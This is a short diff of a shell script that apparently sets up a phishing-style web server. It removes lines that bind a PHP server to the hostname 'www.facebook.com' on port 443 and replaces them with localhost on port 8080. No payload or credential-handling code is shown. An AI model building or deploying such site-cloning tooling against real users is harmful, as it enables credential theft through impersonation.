@@ -208,11 +208,8 @@ about() {
 }
 
 ## Setup website and start php server
-HOST='www.facebook.com'
-PORT='443'
-
-echo "Starting PHP server on https://$HOST:$PORT ..."
-php -S $HOST:$PORT
+HOST='127.0.0.1'
+PORT='8080'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
